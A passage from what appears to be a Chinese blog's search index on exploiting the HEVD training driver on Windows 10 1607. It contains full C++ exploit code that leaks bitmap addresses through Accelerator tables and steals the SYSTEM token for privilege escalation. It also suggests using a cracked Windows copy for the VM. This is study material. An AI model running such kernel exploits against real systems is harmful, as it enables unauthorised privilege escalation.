\u7684\u503c\u90fd\u5728\u53d1\u751f\u53d8\u5316\uff0c\u800c\u4e14\u9ad8\u597d\u591a\u4f4d\u90fd\u662f\u4e0d\u53d8\u7684\uff0c\u770b\u8d77\u6765\u4e0d\u592a\u50cf\u662f\u65e0\u610f\u4e49\u5730\u8ba9 *(PDWORD64)pKernelAddress \u6307\u5411\u4e00\u5757\u65e0\u610f\u4e49\u7684\u5730\u5740\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u77e5\u9053\u600e\u4e48\u624d\u80fd\u77e5\u9053\u5fae\u8f6f\u5230\u5e95\u505a\u4e86\u4ec0\u4e48)","title":"0x01 RS1 \u60c5\u51b5\u5206\u6790"},{"location":"HEVD/bitmapReplace_RS1/#0x02-bitmap-gdi","text":"\u901a\u8fc7\u4e0a\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u77e5\u9053\u901a\u8fc7 GdiSharedHandleTable - pKernel - pvScan0 \u6765\u83b7\u53d6 pvScan0 \u7684\u5730\u5740\u7684\u65b9\u6cd5\u5df2\u7ecf\u884c\u4e0d\u901a\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u529e\u5462\uff1f\u8fd9\u65f6\u5019\u5e94\u8be5\u6709\u4e24\u79cd\u601d\u8def 1. \u5bfb\u627e\u5176\u5b83\u65b9\u6cd5\u6765\u6cc4\u9732 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740 2. \u5bfb\u627e bitmap \u7684\u66ff\u4ee3\u65b9\u6848 \u770b\u5230\u8fd9\u5c0f\u8282\u7684\u6807\u9898\u5e94\u8be5\u5c31\u53ef\u4ee5\u77e5\u9053\u672c\u7bc7\u6587\u7ae0\u91c7\u7528\u7684\u662f\u7b2c\u4e00\u79cd\u601d\u8def\u4e86\u3002 \u6211\u4eec\u77e5\u9053\uff0c\u5728 Windows \u4e2d\u5b58\u5728\u7740 3 \u79cd\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u5206\u522b\u4e3a user object\u3001GDI object\u3001Kernel object\uff0c\u4e00\u5171\u6709 40 \u591a\u79cd\u5bf9\u8c61\u3002 \u56e0\u4e3a\u6ca1\u6709\u505a\u8fc7\u603b\u7ed3\u6211\u4e5f\u4e0d\u6562\u5984\u4e0b\u5b9a\u8bba\uff0c\u4f46\u662f\u50cf\u6211\u4eec\u4e4b\u524d\u7528\u5230\u7684 Event \u5bf9\u8c61\u5c5e\u4e8e Kernel object\uff0c\u5b58\u5728\u4e8e\u975e\u6362\u9875\u6c60\u4e2d\uff0cbitmap \u5bf9\u8c61\u5c5e\u4e8e GDI object\uff0c\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\uff0c\u7136\u540e\u5c31\u662f\u8fd9\u6b21\u6211\u4eec\u8981\u7528\u7684 Accelerator table \u5bf9\u8c61\uff0c\u5c5e\u4e8e user object\uff0c\u4e5f\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\u3002 \u65e2\u7136 Accelerator table \u5bf9\u8c61\u548c bitmap \u5bf9\u8c61\u90fd\u5b58\u5728\u4e8e\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\uff0c\u90a3\u4e48\u5047\u8bbe\u6211\u4eec\u6709\u529e\u6cd5\u83b7\u5f97\u6bcf\u4e00\u4e2a Accelerator table \u5bf9\u8c61\u7684\u5730\u5740\u7684\u8bdd\uff0c\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u6211\u4eec\u91ca\u653e\u6389\u7684 Accelerator table \u5bf9\u8c61\u7684\u7a7a\u95f4\uff0c\u8fd9\u6837\u4e0d\u5c31\u7b49\u540c\u4e8e\u6211\u4eec\u83b7\u5f97\u4e86 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e\u83b7\u5f97\u4e86 pvScan0 \u7684\u5730\u5740\u4e86\u5417\uff1f \u4e3a\u6b64\u6211\u4eec\u9700\u8981 1. \u6709\u529e\u6cd5\u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740 2. \u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u6211\u4eec\u91ca\u653e\u6389\u7684 Accelerator table \u5bf9\u8c61\u7684\u7a7a\u95f4","title":"0x02 \u5229\u7528\u5176\u5b83\u5bf9\u8c61\u6765\u6cc4\u9732 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740"},{"location":"HEVD/bitmapReplace_RS1/#accelerator-table","text":"\u5728 user32.dll \u6a21\u5757\u4e2d\u6709\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u53eb\u505a gSharedInfo\uff0c\u5b83\u7684\u7ed3\u6784\u4e3a \u5b83\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf aheList \u6307\u5411\u4e00\u5f20\u7ed3\u6784\u4e3a USER_HANDLE_ENTRY \u7684\u8868\uff0cUSER_HANDLE_ENTRY \u7684\u7ed3\u6784\u4e3a \u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570 pKernel \u5c31\u50cf GdiSharedHandleTable \u4e2d\u7684 pKernel \u4e00\u6837\uff0c\u6307\u5411\u8be5 user object \u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u4f4d\u7f6e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 user object \u7684 handle \u503c\u6765\u7d22\u5f15\u5176\u5728 aheList \u4e2d\u7684\u4f4d\u7f6e\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 gSharedInfo - aheList - pKernel \u6765\u83b7\u53d6 user object \u5728\u5185\u6838\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u56e0\u4e3a Accelerator table \u5c5e\u4e8e user object\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u6765\u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740","title":"\u83b7\u5f97 Accelerator table \u5bf9\u8c61\u7684\u5730\u5740"},{"location":"HEVD/bitmapReplace_RS1/#bitmap","text":"\u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6211\u4eec\u5728\u6c60\u4e2d\u91ca\u653e\u6389\u4e00\u5757\u7a7a\u95f4\uff0c\u5e76\u4e14\u4e4b\u540e\u5206\u914d\u540c\u7b49\u5927\u5c0f\u7684\u7a7a\u95f4\u65f6\uff0c\u5185\u5b58\u7ba1\u7406\u5668\u662f\u503e\u5411\u4e8e\u5206\u914d\u540c\u4e00\u5757\u7a7a\u95f4\u7ed9\u5b83\u7684\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u4e8e HEVD \u975e\u6362\u9875\u6c60\u6ea2\u51fa\u4e2d pool fengshui \u7684\u65b9\u6cd5\u6765\u63d0\u9ad8\u7a33\u5b9a\u6027\u3002\uff08\u7ecf\u6d4b\u8bd5\u76f4\u63a5\u5206\u914d\u91ca\u653e\u5206\u914d\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u611f\u89c9\u8fd9\u6837\u505a\u8981\u7a33\u5b9a\u4e00\u4e9b\uff09","title":"\u8ba9 bitmap \u5bf9\u8c61\u91cd\u7528\u91ca\u653e\u6389\u7684\u7a7a\u95f4"},{"location":"HEVD/bitmapReplace_RS1/#0x03-rs1","text":"\u9996\u5148\u76f4\u63a5\u8d34\u51fa\u6e90\u7801\uff0c\u7136\u540e\u89e3\u91ca\u4e00\u4e9b\u7ec6\u8282 // bitmapReplace.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Psapi.h TCHAR driverName [ 1024 ]; typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; VOID readOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD64 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); // set \u5199\u7684\u662f hWorker \u7684 pvScan0 \u7684\u503c // \u901a\u8fc7\u63a7\u5236 hWorker \u7684 pvScan0 \u7684\u503c\u6765\u51b3\u5b9a\u5bf9\u54ea\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199 GetBitmapBits ( hWorker , len , whatWrite ); } VOID writeOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD64 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); SetBitmapBits ( hWorker , len , whatWrite ); } typedef struct _SERVERINFO { DWORD dwSRVIFlags ; DWORD cHandleEntries ; WORD wSRVIFlags ; WORD wRIPPID ; WORD wRIPError ; } SERVERINFO , * PSERVERINFO ; typedef struct _USER_HANDLE_ENTRY { void * pKernel ; union { PVOID pi ; PVOID pti ; PVOID ppi ; }; BYTE type ; BYTE flags ; WORD generation ; } USER_HANDLE_ENTRY , * PUSER_HANDLE_ENTRY ; typedef struct _SHAREDINFO { PSERVERINFO psi ; PUSER_HANDLE_ENTRY aheList ; ULONG HeEntrySize ; ULONG_PTR pDispInfo ; ULONG_PTR ulSharedDelts ; ULONG_PTR awmControl ; ULONG_PTR DefWindowMsgs ; ULONG_PTR DefWindowSpecMsgs ; } SHAREDINFO , * PSHAREDINFO ; DWORD64 getKernelBase () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntoskrnlKernelBase ; // find ntoskrnl.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress )) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 )) { char * lowerName = _strlwr ( driverName ); if ( ! strncmp ( driverName , nt , 2 )) { ntoskrnlKernelBase = i ; break ; } else { if ( i == ( cDrivers - 1 )) { printf ( can t find driver name \\n ); exit ( 0 ); } continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); return ( DWORD64 ) driversAddress [ ntoskrnlKernelBase ]; } DWORD64 getSystemEProcessAddr () { DWORD64 ntoskrnlKernelBase = getKernelBase (); DWORD64 ntoskrnlUserBase = ( DWORD64 ) LoadLibrary ( driverName ); if ( ntoskrnlUserBase == NULL ) { printf ( load library failed! \\n ); return 0 ; } DWORD64 PsInitialSystemProcessUserSpaceAddr = ( DWORD64 ) GetProcAddress (( HMODULE ) ntoskrnlUserBase , PsInitialSystemProcess ); DWORD64 PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + ( PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase ); return PsInitialSystemProcessKernelSpaceAddr ; } int main () { PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 698 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); HACCEL hAccel_1 [ 100 ] = { 0 }; HACCEL hAccel_2 [ 7 ] = { 0 }; for ( int i = 0 ; i 100 ; i ++ ) { hAccel_1 [ i ] = CreateAcceleratorTable ( lPaccel , nSize ); } for ( int i = 0 ; i 7 ; i ++ ) { hAccel_2 [ i ] = CreateAcceleratorTable ( lPaccel , nSize ); } leakAddr = handleTable [ LOWORD ( hAccel_2 [ 2 ])]; DWORD64 hManagerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Manager bitmap addr: 0x%p\\n , hManagerAddr); DestroyAcceleratorTable ( hAccel_2 [ 2 ]); HBITMAP hManagerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); leakAddr = handleTable [ LOWORD ( hAccel_2 [ 5 ])]; DWORD64 hWorkerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Worker bitmap addr: 0x%p\\n , hWorkerAddr); DestroyAcceleratorTable ( hAccel_2 [ 5 ]); HBITMAP hWorkerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); for ( int i = 0 ; i 7 ; i ++ ) { if (( i != 2 ) ( i != 5 )) { DestroyAcceleratorTable ( hAccel_2 [ i ]); } } for ( int i = 0 ; i 100 ; i ++ ) { DestroyAcceleratorTable ( hAccel_1 [ i ]); } // ------\u6211\u662f\u5206\u5272\u7ebf------ // \u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97 bitmap \u7684\u5730\u5740\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u8ddf RS1 \u4e4b\u524d\u4e00\u6837\u5229\u7528 bitmap \u5c31\u597d\u4e86 DWORD64 ManagerpvScan0Address = hManagerAddr + 0x18 + 0x38 ; printf ( Manager pvScan0 Addr: 0x%p \\n , ManagerpvScan0Address ); DWORD64 WorkerpvScan0Address = hWorkerAddr + 0x18 + 0x38 ; printf ( Worker pvScan0 Addr: 0x%p \\n , WorkerpvScan0Address ); PPayload payload = NULL ; // malloc payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); payload - what = ( PULONG_PTR ) WorkerpvScan0Address ; payload - where = ( PULONG_PTR ) ManagerpvScan0Address ; DWORD BytesReturned = 0 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); // \u5df2\u7ecf overwrite \u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528 SetBitmapBits \u548c GetBitmapBits \u6765\u8bfb\u5199 DWORD64 systemEprocessAddr = 0 ; LPVOID lpSystemToken = NULL ; // \u83b7\u53d6 system \u8fdb\u7a0b\u7684 token readOOB ( hManagerbitmap , hWorkerbitmap , getSystemEProcessAddr (), systemEprocessAddr , sizeof ( DWORD64 )); readOOB ( hManagerbitmap , hWorkerbitmap , ( systemEprocessAddr + 0x358 ), lpSystemToken , sizeof ( DWORD64 )); printf ( system eprocess addr: 0x%p \\n , systemEprocessAddr ); // _eprocess + 0x0f8 \u662f token 0x358 // _eprocess + 0x0B8 \u662f ActiveProcessLinks.Flink 0x2f0 // _eprocess + 0x0b4 \u662f processid 0x2e8 // \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 _eprocess DWORD64 lpNextEPROCESS = 0 ; LPVOID lpCurrentPID = NULL ; DWORD64 dwCurrentPID ; LIST_ENTRY lpNextEntryAddreess = { 0 }; DWORD64 currentProcessID = GetCurrentProcessId (); // \u901a\u8fc7PID\u5224\u65ad\u662f\u5426\u83b7\u53d6\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5730\u5740 readOOB ( hManagerbitmap , hWorkerbitmap , systemEprocessAddr + 0x2f0 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); do // \u6839\u636ePID\u662f\u5426\u627e\u5230\u5f53\u524d\u8fdb\u7a0b { // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8fdb\u7a0b lpNextEPROCESS = ( DWORD64 )(( PUCHAR ) lpNextEntryAddreess . Flink - 0x2f0 ); // \u83b7\u53d6PID readOOB ( hManagerbitmap , hWorkerbitmap , lpNextEPROCESS + 0x2e8 , lpCurrentPID , sizeof ( LPVOID )); dwCurrentPID = LOWORD ( lpCurrentPID ); readOOB ( hManagerbitmap , hWorkerbitmap , lpNextEPROCESS + 0x2f0 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); } while ( dwCurrentPID != currentProcessID ); DWORD64 currentTokenAddress = ( DWORD64 ) lpNextEPROCESS + 0x358 ; writeOOB ( hManagerbitmap , hWorkerbitmap , currentTokenAddress , lpSystemToken , sizeof ( LPVOID )); system ( whoami \\n ); CloseHandle ( hManagerbitmap ); CloseHandle ( hWorkerbitmap ); return 0 ; } \u9996\u5148\u662f\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u70b9\uff0csize \u7684\u5927\u5c0f size \u7684\u5927\u5c0f\u4e0d\u80fd\u592a\u5c0f\uff0c\u592a\u5c0f\u7684\u8bdd\u91cd\u7528\u6027\u6781\u4f4e\uff0c\u5373\u4f7f\u4f60\u7528\u4e86 pool fengshui \u6316\u6d1e\u6765\u671f\u5f85\u5185\u5b58\u7ba1\u7406\u5668\u5f80\u6d1e\u4e0a\u91cd\u7528 bitmap \u5bf9\u8c61\uff0c\u4f60\u4f1a\u53d1\u73b0\u91cd\u7528\u6027\u8fd8\u662f\u6781\u4f4e \u5f53\u7136\u592a\u5927\u4e5f\u4e0d\u597d\u3002\u6240\u4ee5\u4f60\u4f1a\u770b\u5230 size \u7684\u503c\u5728 700 \u5de6\u53f3 \u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u6bb5\u5c0f\u4ee3\u7801 // test2.cpp : Defines the entry point for the console application. // #include stdafx.h #include Windows.h typedef struct _SERVERINFO { DWORD dwSRVIFlags ; DWORD cHandleEntries ; WORD wSRVIFlags ; WORD wRIPPID ; WORD wRIPError ; } SERVERINFO , * PSERVERINFO ; typedef struct _USER_HANDLE_ENTRY { void * pKernel ; union { PVOID pi ; PVOID pti ; PVOID ppi ; }; BYTE type ; BYTE flags ; WORD generation ; } USER_HANDLE_ENTRY , * PUSER_HANDLE_ENTRY ; typedef struct _SHAREDINFO { PSERVERINFO psi ; PUSER_HANDLE_ENTRY aheList ; ULONG HeEntrySize ; ULONG_PTR pDispInfo ; ULONG_PTR ulSharedDelts ; ULONG_PTR awmControl ; ULONG_PTR DefWindowMsgs ; ULONG_PTR DefWindowSpecMsgs ; } SHAREDINFO , * PSHAREDINFO ; int main () { PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 100 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); for ( int i = 0 ; i 10 ; i ++ ) { HACCEL hAccel = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel )]; DWORD64 accelAddr = ( DWORD64 )( leakAddr - pKernel ); printf ( accel user object addr: 0x%p \\n , accelAddr ); DestroyAcceleratorTable ( hAccel ); } return 0 ; } \u518d\u770b\u4e00\u4e0b\u5b83\u7684\u6267\u884c\u7ed3\u679c \u8fd9\u7cdf\u7cd5\u7684\u91cd\u7528\u6027\u3002 : ) \u7136\u540e\u5c31\u662f CreateBitmap(0x710, 0x2, 0x1, 0x8, NULL) \u548c int nSize = 698 \u521b\u5efa\u51fa\u6765\u7684 bitmap \u5bf9\u8c61\u548c Accelerator table \u5bf9\u8c61\u7684\u5927\u5c0f\u6b63\u597d\u76f8\u7b49\uff0c\u90fd\u662f 0x1080 byte\uff0c\u4f60\u95ee\u6211\u600e\u4e48\u5f97\u51fa\u6765\u7684\uff1f\u8bd5\u51fa\u6765\u7684 : ) \u5f53\u7136\uff0c\u8fd9\u4e2a\u5927\u5c0f\u5728\u4e0d\u540c\u7684\u73af\u5883\u4e0b\u503c\u53ef\u80fd\u4e0d\u4e00\u6837\uff0c\u6bd4\u5982\u8bf4\u5728 windows 7 x64 \u4e0b\u597d\u50cf\u5c31\u8981\u6bd4\u5728 RS1\uff08windows 10 1607 x64\uff09\u4e0b\u8981\u5c0f\u4e00\u70b9 \u5176\u5b83\u5e94\u8be5\u6ca1\u4ec0\u4e48\u597d\u89e3\u91ca\u7684\u4e86\uff0c\u83b7\u5f97\u5230\u5730\u5740\u4e4b\u540e\u7684\u5229\u7528\u4e0e bitmap \u7684\u5229\u7528\u65b9\u5f0f\u4e00\u6a21\u4e00\u6837\u3002 \u6700\u540e\uff0c\u867d\u7136\u8fd9\u91cc\u7528\u7684\u662f pool fengshui \u7684\u65b9\u6cd5\uff0c\u4f46\u5c31\u50cf\u4e0a\u6587\u8bf4\u5230\u7684\uff0c\u76f4\u63a5\u5206\u914d\u91ca\u653e\u5206\u914d\u4e5f\u53ef\u884c\uff0c\u6bd4\u5982\u4f60\u628a\u5206\u5272\u7ebf\u6ce8\u91ca\u5f80\u4e0a\u7684\u4ee3\u7801\u66ff\u6362\u6210 PUSER_HANDLE_ENTRY leakAddr = NULL ; PSHAREDINFO gSharedInfo = ( PSHAREDINFO ) GetProcAddress ( GetModuleHandle ( user32.dll ), gSharedInfo ); PUSER_HANDLE_ENTRY handleTable = gSharedInfo - aheList ; int nSize = 698 ; LPACCEL lPaccel = NULL ; // LPTR \u610f\u4e3a LMEM_FIXED | LMEM_ZEROINIT\uff0c\u5373\u5206\u914d\u56fa\u5b9a\u5185\u5b58\u5e76\u521d\u59cb\u5316\u4e3a 0 lPaccel = ( LPACCEL ) LocalAlloc ( LPTR , sizeof ( ACCEL ) * nSize ); HACCEL hAccel_1 = NULL ; hAccel_1 = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel_1 )]; DWORD64 hManagerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Manager bitmap addr: 0x%p\\n , hManagerAddr); DestroyAcceleratorTable ( hAccel_1 ); HBITMAP hManagerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); HACCEL hAccel_2 = NULL ; hAccel_2 = CreateAcceleratorTable ( lPaccel , nSize ); leakAddr = handleTable [ LOWORD ( hAccel_2 )]; DWORD64 hWorkerAddr = ( DWORD64 )( leakAddr - pKernel ); //printf( Worker bitmap addr: 0x%p\\n , hWorkerAddr); DestroyAcceleratorTable ( hAccel_2 ); HBITMAP hWorkerbitmap = CreateBitmap ( 0x710 , 0x2 , 0x1 , 0x8 , NULL ); \u6267\u884c\u8d77\u6765\u4e5f\u662f\u6ca1\u95ee\u9898\u7684\uff0c\u4ee5\u4e0b\u662f\u8fd9\u79cd\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c \u53ef\u4ee5\u770b\u5230\u63d0\u6743\u6210\u529f\u4e86","title":"0x03 RS1 \u4e0b\u7684\u66ff\u4ee3\u65b9\u6cd5\u5229\u7528"},{"location":"HEVD/bitmapReplace_RS1/#0x04","text":"\u63a5\u4e0b\u6765\u5b66\u4e60\u4e00\u4e0b\u5728 RS2 \u4e0b\u7684\u5229\u7528 \u9a6c\u4e0a\u56fd\u5e86\u4e86\uff0c\u8981\u662f\u56fd\u5e86\u524d\u6ca1\u66f4\u7684\u8bdd\u5c31\u56fd\u5e86\u540e\u518d\u66f4\u4e86\uff0c\u56fd\u5e86\u800d\u4e00\u800d\uff0c\u6bd5\u7adf 70 \u5468\u5e74\u5e86\u563b\u563b\uff0c\u80af\u5b9a\u8981\u770b\u770b\u9605\u5175\u554a\u5565\u7684\u4e0d\u662f\uff0c\u6700\u8fd1\u8bf4\u7684\u4ee5\u524d\u9605\u5175\u98de\u673a\u98de\u4e24\u904d\u8ba9\u6211\u633a\u611f\u6982\u7684\u3002 \u6700\u540e\uff0c\u795d\u7956\u56fd\u8d8a\u6765\u8d8a\u5f3a\u5927\uff0c\u56fd\u5bcc\u5175\u5f3a\u3002 \uff1a ) 2019.9.26","title":"0x04 \u7ed3\u675f\u8bed"},{"location":"HEVD/buildEnv/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u5728\u5f00\u59cb\u4e4b\u524d\u80af\u5b9a\u8981\u5148\u642d\u5efa\u8d77 HEVD \u7684\u73af\u5883\u3002\u73af\u5883\u642d\u5efa\u4e00\u76f4\u90fd\u662f\u4e00\u4ef6\u8d39\u65f6\u7684\u5de5\u4f5c\uff0c\u800c\u4e14\u8bb2\u771f\u8fd9\u4e2a\u8fc7\u7a0b\u8981\u662f\u4e00\u76f4\u51fa\u73b0\u95ee\u9898\u771f\u7684\u4f1a\u8ba9\u4eba\u6709\u70b9\u5c0f\u96be\u53d7\u3002\u4e0d\u8fc7\u6bcf\u4e2a\u4eba\u7684\u73af\u5883\u80af\u5b9a\u90fd\u6216\u591a\u6216\u5c11\u6709\u6240\u533a\u522b\uff0c\u6240\u4ee5\u8fd9\u7bc7\u6587\u7ae0\u66f4\u591a\u7684\u662f\u8d77\u4e00\u4e2a\u53c2\u8003\u4f5c\u7528\uff0c\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\u8fd8\u662f\u8981\u843d\u5b9e\u81ea\u5df1\u7684\u73af\u5883\u4e0a\u3002 \u90a3\u4e48\u9996\u5148\u5c31\u662f\u6211\u4eec\u5e94\u8be5\u8981\u51c6\u5907\u4ec0\u4e48\u6837\u7684\u73af\u5883\u4ee5\u53ca\u4e3a\u4ec0\u4e48 win7 pro x86 sp1: \u8fd9\u662f\u6211\u4e2a\u4eba\u4f7f\u7528\u7684\u73af\u5883\uff0c\u5f53\u7136\u4f7f\u7528x64\u4e5f\u884c windbg + virtualkd: virtualkd \u7684\u4f5c\u7528\u4e00\u662f\u52a0\u901f\u5bbf\u4e3b\u673a\u4e0e\u865a\u62df\u673a\u7684\u901a\u4fe1\u901f\u5ea6\uff0c\u4e8c\u662f\u5e2e\u6211\u4eec\u5feb\u901f\u6784\u5efa\u8d77 debug \u73af\u5883\u3002 hevd + osrloader: \u5e73\u65f6\u6211\u4eec\u5b89\u88c5\u9a71\u52a8\u7a0b\u5e8f\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b89\u88c5\u7a0b\u5e8f\u6765\u8fdb\u884c\u5b89\u88c5\u7684\uff0c\u4f46\u662f\u6211\u4eec\u7f16\u8bd1\u51fa\u6765\u7684\u53ea\u6709\u4e00\u4e2a.sys\u6587\u4ef6\uff0c\u8981\u60f3\u8ba9\u8fd9\u4e2a.sys\u6587\u4ef6\u5728\u865a\u62df\u673a\u4e0a\u8d77\u4f5c\u7528\u7684\u8bdd\uff0c\u5c31\u8981\u7528\u5230 osrloader \u6765\u52a0\u8f7d\u8be5\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5f53\u7136\u5c31\u7b97\u4e0d\u89e3\u91ca\u5b83\u4eec\u7684\u4f5c\u7528\u5927\u5bb6\u4e5f\u80fd\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u660e\u767d\u5b83\u4eec\u90fd\u662f\u505a\u4ec0\u4e48\u7684\uff0c\u53ea\u662f\u53ef\u80fd\u8981\u8017\u8d39\u4e00\u4e9b\u65f6\u95f4\u3002\u8ba9\u5927\u5bb6\u4e00\u5f00\u59cb\u5c31\u660e\u767d\u5404\u4e2a\u8f6f\u4ef6\u7684\u4f5c\u7528\u4e5f\u80fd\u5728\u4f7f\u5927\u5bb6\u5728\u642d\u5efa\u7684\u8fc7\u7a0b\u4e2d\u66f4\u4e3a\u6e05\u6670\u5730\u77e5\u9053\u81ea\u5df1\u5728\u505a\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\u8981\u8fd9\u6837\u505a\u3002 0x01 \u73af\u5883\u642d\u5efa \u7f51\u4e0a\u5173\u4e8e HEVD \u7684\u642d\u5efa\u8fc7\u7a0b\u4ee5\u53ca\u5404\u4e2a\u8f6f\u4ef6\u7684\u4e0b\u8f7d\u3001\u5b89\u88c5\u4e0e\u4f7f\u7528\u8fc7\u7a0b\u90fd\u6709\u4e0d\u5c11\u7684\u6559\u7a0b\u4e86\uff0c\u56e0\u6b64\u672c\u8282\u66f4\u591a\u7684\u662f\u70b9\u51fa\u4e00\u4e9b\u5173\u952e\u70b9\uff0c\u5269\u4e0b\u7684\u6211\u76f8\u4fe1\u4e0d\u7528\u5199\u5927\u5bb6\u4e5f\u61c2\u3002 win7pro x86 sp1\u865a\u62df\u673a\u7684\u5b89\u88c5 emmm\u6211\u89c9\u5f97\u8fd9\u4e2a\u6211\u5e94\u8be5\u4e0d\u7528\u591a\u8bf4\u4e86\uff0c\u5c31\u662f\u5efa\u8bae\u5927\u5bb6\u4e0bpro\u7248\u7684\u6216\u8005\u662fenterprise\u7248\u7684\uff0c\u56e0\u4e3a\u6bd4\u8f83\u597d\u7834\u89e3 (\u652f\u6301\u6b63\u7248\u554a\u4e0d\u8fc7\u4e00\u4e2a\u865a\u62df\u673a\u5c31\u6ca1\u5fc5\u8981\u7528\u6b63\u7248\u7684\u4e86\u5427emmm windbg \u5982\u679c\u5927\u5bb6\u662f win10 \u7535\u8111\u7684\u8bdd\u76f4\u63a5\u5728\u5e94\u7528\u5546\u5e97\u91cc\u641c\u7d22 windbg preview \u5c31\u53ef\u4ee5\u4e86\uff0c\u4e2a\u4eba\u89c9\u5f97\u8fd9\u4e2a\u7248\u672c\u7684 windbg 